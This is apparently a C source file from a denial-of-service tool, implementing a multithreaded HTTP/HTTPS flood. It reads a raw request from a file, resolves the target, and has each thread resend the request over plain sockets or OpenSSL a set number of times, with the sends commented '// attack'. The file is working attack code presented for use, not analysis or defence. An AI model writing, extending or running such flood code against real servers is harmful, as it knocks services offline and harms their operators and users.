#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>

#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h> // hostent

#include <openssl/ssl.h>
#include <openssl/evp.h>
#include <openssl/err.h>

#include "../main.h"

extern void info(const char *fmt, ...);
extern void warning(const char *fmt, ...);
extern void error(const char *fmt, ...);

static char *_read_file(const char *path)
{
    if (strlen(path) == 0)
        error("please set request file path");

    int cursor = 0;
    char ch;
    // char ch_cr = '\r';
    // char ch_lf = '\n';
    // ASCII
    unsigned int ch_lf = 10;
    unsigned int ch_cr = 13;

    FILE *fp = fopen(path, "r");
    if (!fp)
        error(strerror((errno)));

    fseek(fp, 0L, SEEK_END);
    long sz = ftell(fp); // file size
    rewind(fp);

    char *buff = (char *)calloc(sz * 2, sizeof(char));
    while (1)
    {
        ch = fgetc(fp);
        if (ch == EOF)
            break;
        else if ((unsigned int)ch != 10 && (unsigned int)ch != 13)
            buff[cursor++] = ch;
        else
        {
            buff[cursor++] = ch_cr;
            buff[cursor++] = ch_lf;
        }
    }
    fclose(fp);
    buff[cursor++] = ch_cr;
    buff[cursor++] = ch_lf;
    buff[cursor++] = ch_cr;
    buff[cursor++] = ch_lf;

    return buff;
}

#ifdef DEBUG
static int _show_certs(SSL *ssl)
{
    X509 *cert;

    cert = SSL_get_peer_certificate(ssl);
    if (cert)
    {
        char *line;
        warning("server certificates:");
        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        warning("subject: %s", line);
        free(line);
        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        warning("issuer: %s", line);
        free(line);
        X509_free(cert);
    }
    else
    {
        error("no certificates found!");
    }
    return 0;
}
#endif

static char **_get_ip(const char *host)
{
    int i;
    struct hostent *he;

    he = gethostbyname(host);
    if (!he)
        error(strerror(errno));

    // AF_INET
    // AF_INET6
    if (he->h_addrtype == AF_INET6)
        error("IPv6 is not supported!");

    char **iplist = (char **)calloc(he->h_length, sizeof(char *));
    // IP
    for (i = 0; he->h_addr_list[i]; i++)
    {
        iplist[i] = inet_ntoa(*((struct in_addr *)he->h_addr_list[i]));
#ifdef DEBUG
        printf("Aliases [%d][%s]: %s\n", i, he->h_aliases[i], iplist[i]);
#endif
    }

    return iplist;
}

static int _tcp_create_socket(const char *ip, const int port)
{

    // struct hostent *he;
    struct sockaddr_in server_addr;
    int sock;
    int en = 1;

    server_addr.sin_addr.s_addr = inet_addr(ip);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1)
    {
        if (errno == 1)
            warning("this program should run as root user!");
        else if (errno == 24)
        {
            warning("you shoud check max file number use 'ulimit -n' in linux.");
            warning("and change the max file number use 'ulimit -n <setting number>'.");
        }
        warning(strerror(errno));
        return -1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &en, sizeof(int)))
    {
        warning(strerror(errno));
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        close(sock);
        warning(strerror(errno));
        return -1;
    }

    return sock;
}

static int _send(const int sock, const char *request, SSL *ssl)
{

    int sent_size = 0;
    int request_size = strlen(request);
    int ret = 0;

    if (!ssl) // http
    {
        while (sent_size < request_size)
        {
            ret = send(sock, request + sent_size, (request_size - sent_size), 0);
            if (ret < 0)
                warning(strerror(errno));
            sent_size += ret;
        }
    }
    else // https
    {
        unsigned long written;
        SSL_write_ex(ssl, request, request_size, &written);
        sent_size = written;
    }

    return sent_size;
}

#ifdef DEBUG
static int _recv(const int socket, char **response, SSL *ssl)
{
    // http recv function
    // there has some different between tcp and http recv function

    int buff_size = 4096;
    int ret = 0;
    char *buff = (char *)calloc(buff_size, sizeof(char));

    if (!ssl) // http
    {
        while (1)
        {
            ret = recv(socket, buff, buff_size, 0);
            if (ret < 0)
                error(strerror(errno));
            else if (ret == 0)
                break;
        }
    }
    else // https
    {
        unsigned long readbytes = 0;
        while (1)
        {
            ret = SSL_read_ex(ssl, buff, buff_size, &readbytes);
            if (ret == 0)
                error("ssl read error: %d", SSL_get_error(ssl, ret));
            else if (ret == 1)
                break;
        }
    }

    (*response) = buff;
    return 0;
}
#endif

static int _connect_socket(char **iplist, const int port)
{
    int sock = -1;
    int i = 0;
    while (sock < 0)
    {
        if (!iplist[i])
            error("no ip can connect");

        sock = _tcp_create_socket(iplist[i], port);
        // info("%s connected", iplist[i++]);
        if (sock < 0)
            warning("%s can not connect", iplist[i++]);
    }

    return sock;
}

static int _http(char **iplist, const int port, const char *request)
{
    int sock = _connect_socket(iplist, port);

#ifdef DEBUG
    _send(sock, request, NULL);
    char *response;
    _recv(sock, &response, NULL);
    warning("HTTP response:");
    printf("%s\n", response);
    free(response);
#else
    _send(sock, request, NULL); // attack
#endif

    close(sock);

    return 0;
}

static int _https(char **iplist, const int port, const char *request)
{

    // 1 create socket
    int sock = _connect_socket(iplist, port);

    // 2 ssl init
    SSL_CTX *ctx;
    SSL *ssl;
    const SSL_METHOD *method;
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    method = SSLv23_client_method();
    ctx = SSL_CTX_new(method);
    if (!ctx)
    {
        ERR_print_errors_fp(stdout);
        error("ctx create failed");
    }

    // 3 add ssl
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    int ret = SSL_connect(ssl);
    if (ret < 0)
    {
        //int e = SSL_get_error(ssl, ret);
        ERR_print_errors_fp(stdout);
        error("SSL_connect failed, please pay attention to your https port");
    }

#ifdef DEBUG
    warning("connect with %s encryption", SSL_get_cipher(ssl));
    _show_certs(ssl);
    // 4 send data
    _send(sock, request, ssl); // for test
    // 5 recv
    char *response;
    _recv(sock, &response, ssl);
    warning("HTTPS response:");
    printf("%s\n", response);
    free(response);
#else
    _send(sock, request, ssl);
#endif

    // 6 close
    close(sock);
    SSL_CTX_free(ctx);
    SSL_free(ssl);
    return 0;
}

static void _attack_thread(pHFTP parameters)
{
    char *request = parameters->request;
    char *content = _read_file(request);
    char *url = parameters->url;
    int port = parameters->port;
    int https = parameters->https;
    char **iplist = _get_ip(url);

#ifdef DEBUG
    warning("thread start...");
    if (https == HTTP)
    {
        warning("sending http content...");
        _http(iplist, port, content);
    }
    else
    {
        warning("sending https content...");
        _https(iplist, port, content);
    }
#else
    unsigned int pn = parameters->pn;
    if (https == HTTP)
        for (unsigned int i = 1; i != pn; i++)
            _http(iplist, port, content); // attack

    else if (https == HTTPS)
        for (unsigned int i = 1; i != pn; i++)
            _https(iplist, port, content);
#endif

    free(content);
    free(iplist);
}

int http_flood_attack(char *url, int port, ...)
{
    va_list vlist;
    va_start(vlist, port);
    char *request = va_arg(vlist, char *);
    int https = va_arg(vlist, int);
    int thread_number = va_arg(vlist, int);
    unsigned int pn = va_arg(vlist, int);
    va_end(vlist);

    // http == 0
    // https == 1

    pHFTP parameters = (pHFTP)malloc(sizeof(HFTP));
    parameters->url = url;
    parameters->port = port;
    parameters->request = request;
    parameters->https = https;
    parameters->pn = pn;

    pthread_t tid_list[thread_number];
    pthread_attr_t attr;
    int ret, i;

    if (port == 0)
        error("please specify a target port");

    for (i = 0; i < thread_number; i++)
    {
        if (pthread_attr_init(&attr))
            error(strerror(errno));
        // if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
            error(strerror(errno));
        // create thread
        ret = pthread_create(&tid_list[i], &attr, (void *)_attack_thread, parameters);
        if (ret != 0)
            error("create pthread failed, ret: %d, %s", ret, strerror(errno));
        pthread_attr_destroy(&attr);
    }
    // pthread_detach(tid);
    // join them all
    for (i = 0; i < thread_number; i++)
        pthread_join(tid_list[i], NULL);

    free(parameters);
    return 0;
}
